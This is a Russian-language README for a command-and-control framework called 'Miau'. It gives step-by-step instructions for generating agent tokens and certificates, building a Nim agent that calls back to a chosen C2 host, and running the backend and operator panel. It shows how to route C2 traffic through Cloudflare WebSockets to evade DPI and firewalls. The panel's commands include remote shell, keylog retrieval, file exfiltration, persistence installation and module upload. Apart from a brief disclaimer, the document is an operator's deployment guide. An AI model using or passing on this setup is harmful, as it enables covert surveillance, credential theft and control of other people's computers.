# Miau C2 Framework

[Русский](README_RU.md) | [English](README.md)

> **ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ**: Этот проект предоставляется **исключительно в образовательных целях и для авторизованных исследований безопасности**. Авторы не одобряют и не поощряют несанкционированный доступ к компьютерным системам. Используйте только на системах, которыми вы владеете или имеете явное разрешение на тестирование.

## Обзор

Miau - инструмент удаленного администрирования с зашифрованным C2 каналом связи, туннелированием через CDN и веб-панелью управления.

## Архитектура

```
Агент (Nim) --TCP+TLS--> Бэкенд (Python) <--HTTP--> Панель (HTML)
                     \                             /
                      ----WebSocket (DCT)--------
```

### Компоненты

| Компонент | Путь | Назначение |
|-----------|------|------------|
| Бэкенд | `backend/` | C2 сервер, REST API, WebSocket туннель |
| Агент | `client/nim/` | Агент на Nim |
| Сборщик | `builder/` | Скрипт компиляции агента |
| Панель | `panel/` | Веб-интерфейс управления |
| Proto | `proto/` | Protobuf схемы сообщений |

## Системные требования

### Бэкенд
- Python 3.10+
- Nim crypto библиотеки

### Агент
- Nim 2.0+
- OpenSSL 3.x
- Nimcrypto package

## Быстрый старт

### 1. Установка зависимостей

**Бэкенд (Windows):**
```powershell
cd backend
pip install -r requirements.txt
```

**Nim + OpenSSL (Windows через WinGet):**
```powershell
winget install nim.nim
winget install BrechtSanders.WinLibs.MCF.UCRT
```

**Nimcrypto:**
```powershell
nimble install nimcrypto@0.7.3
```

### 2. Генерация TLS сертификата

```powershell
cd backend
python gen_cert.py
```

Создает:
- `certs/server.crt` - TLS сертификат
- `certs/server.key` - Приватный ключ
- `certs/server.der` - DER формат для пиннинга
- `certs/fingerprint.txt` - SHA256 отпечаток для агента

### 3. Генерация токена агента

```powershell
cd backend
python keygen.py --label "client-1" --count 1
```

Формат вывода: `<токен> <aes_ключ_hex> <метка>`

Пример:
```
miau_ITkN2mWGRu7nxuBabAtaKsVxOeQx3Y5i 2efdec9ea5473288cf4e73bae7f8edfcb585801064498bbae67dcd5f9c2e4461 client-1
```

### 4. Сборка агента

```powershell
cd builder
.\build_agent.ps1 -Token "miau_..." -AesKeyHex "..." -Pin "B8EF601F4FAD16BDB97431D26554A435EFF971F516DE579D1D8267E31F549963" -Host "127.0.0.1" -Port 9000
```

Параметры:
- `-Token` - Токен из keygen
- `-AesKeyHex` - AES ключ из keygen
- `-Pin` - Отпечаток сертификата
- `-Host` - IP C2 сервера
- `-Port` - Порт C2 сервера (по умолчанию 9000)

### 5. Запуск бэкенда

```powershell
cd backend
python run.py --port 9000 --api-port 8080
```

Опции:
- `--port` - TCP порт для подключений агентов (по умолчанию 9000)
- `--api-port` - HTTP порт для панели (по умолчанию 8443)
- `--no-rest` - Только listener, без API

### 6. Доступ к панели

Открой браузер: `http://localhost:8080/`

Данные для входа:
- Пароль: `miau` (из config.toml)
- TOTP: Используй текущий код

**Настройка TOTP:**
- Секрет: `JVUWC5KQMFXGK3A`
- Цифр: 6
- Интервал: 30 секунд
- Издатель: MiauPanel

Используй любое TOTP приложение (Google Authenticator, Aegis и т.д.)

## Конфигурация

### config.toml

```toml
[server]
host = "0.0.0.0"
tcp_port = 9000
api_port = 8443
hb_interval = 15
hb_timeout = 60

[tls]
cert_dir = "./certs"
common_name = "miau-relay"
org = "Miau"
country = "NL"
valid_days = 3650
rsa_bits = 4096

[auth]
operator_password = "miau"
totp_issuer = "MiauPanel"

[store]
db_path = "./miau.db"
```

## DCT - Domain C2 Tunneling

DCT маршрутизирует C2 трафик через WebSocket для обхода DPI/файрволов. Трафик выглядит как обычный HTTPS/WSS.

### Принцип работы

1. Агент подключается к `wss://cdn-domain/dct/{token}`
2. CDN проксирует WebSocket на бэкенд
3. Бэкенд апгрейдит соединение до WebSocket и пересылает фреймы

### Настройка с Nginx + Cloudflare

**Конфиг Nginx:**
```nginx
server {
    listen 443 ssl;
    server_name твой-домен.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location /dct/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 86400;
    }
}
```

**Cloudflare:**
1. Добавь A запись указывающую на IP сервера
2. Включи прокси (оранжевое облако)
3. SSL/TLS режим: Full (strict)

## API Reference

### Аутентификация
Все API endpoints (кроме / и /api/auth/login) требуют заголовки:
- `X-Panel-Pw`: пароль оператора
- `X-Panel-Totp`: текущий TOTP код

### Endpoints

| Метод | Путь | Описание |
|-------|------|----------|
| POST | /api/auth/login | Вход с паролем + TOTP |
| GET | /api/health | Проверка состояния |
| GET | /api/clients | Список всех клиентов |
| GET | /api/client/{id} | Детали клиента |
| POST | /api/client/{id}/cmd | Отправить команду |
| GET | /api/command/{id}/resp | Получить ответ команды |
| GET | /api/stats | Статистика |
| GET | /api/tokens | Список токенов |
| POST | /api/tokens | Создать токен |
| POST | /api/tokens/{token}/revoke | Отозвать токен |
| GET | /api/keylogs/{token} | Получить кейлоги |
| GET | /api/modules | Список модулей |
| POST | /api/modules | Загрузить модуль |

### Команды

| Команда | Описание |
|---------|----------|
| shell | Выполнить команду в shell |
| file_list | Список файлов в директории |
| file_download | Скачать файл (base64) |
| file_write | Записать файл (path\|base64) |
| file_delete | Удалить файл/директорию |
| process_list | Список процессов |
| process_kill | Убить процесс по PID |
| net_list | Сетевые соединения |
| sysinfo | Информация о системе |
| ping | Пинг агента |
| persist_install | Установить персистентность |
| persist_remove | Удалить персистентность |
| uninstall | Удалить агента |

## Структура файлов

```
Miau/
├── backend/
│   ├── run.py           # Главная точка входа
│   ├── listener.py      # TCP+TLS listener
│   ├── api.py           # REST API + сервер панели
│   ├── dct_tunnel.py    # WebSocket DCT туннель
│   ├── store.py         # SQLite база данных
│   ├── codec.py         # AES-256-GCM кодек
│   ├── config.py        # Загрузчик конфигурации
│   ├── keygen.py        # Генератор токенов
│   ├── gen_cert.py      # Генератор сертификатов
│   ├── certs/           # TLS сертификаты
│   └── miau.db          # SQLite база данных
├── client/
│   └── nim/
│       ├── agent.nim    # Главный цикл агента
│       ├── commands.nim # Реализация команд
│       ├── transport.nim # TLS транспорт
│       ├── dct_transport.nim # WebSocket транспорт
│       ├── miau_codec.nim # Protobuf кодек
│       ├── ca_embedded.nim # Встроенный CA сертификат
│       ├── persistence.nim # Персистентность
│       └── miau_config.nim # Конфигурация при сборке
├── builder/
│   └── build_agent.ps1  # Скрипт сборки
├── panel/
│   └── panel.html       # Веб-панель
└── proto/
    ├── messages.proto   # Определения сообщений
    └── enums.proto      # Определения enum
```

## Безопасность

- Весь C2 трафик зашифрован AES-256-GCM
- Certificate pinning предотвращает MITM
- PSK для начального рукопожатия
- Уникальные AES-256 ключи для каждого агента
- Требуется TOTP для доступа к панели

## Устранение проблем

**Агент не подключается:**
1. Проверь что сервер запущен: `netstat -an | findstr 9000`
2. Убедись что TLS сертификат существует
3. Проверь логи агента: `agent_stderr.log`
4. Убедись что токен есть в базе

**Не войти в панель:**
1. Получи текущий TOTP код
2. Проверь пароль в config.toml
3. Убедись что API запущен

**DCT не работает:**
1. Проверь поддержку WebSocket в CDN конфиге
2. Убедись что файрвол разрешает порт 443
3. Протестируй прямое WebSocket подключение

## Сборка из исходников

### Компиляция protobuf (если изменены)
```powershell
cd proto
protoc --python_out=../backend --nim_out=../client/nim messages.proto enums.proto
```

### Сборка агента вручную
```powershell
cd client/nim
nim c -d:ssl -d:useOpenssl3 -d:ServerAddr=HOST -d:ServerPort=PORT -d:AgentToken=TOKEN -d:AgentAesKey=KEY -d:ServerPin=PIN agent.nim
```

## Версия

Miau v1.0.0
DCT Module v1.0
Panel v1.0
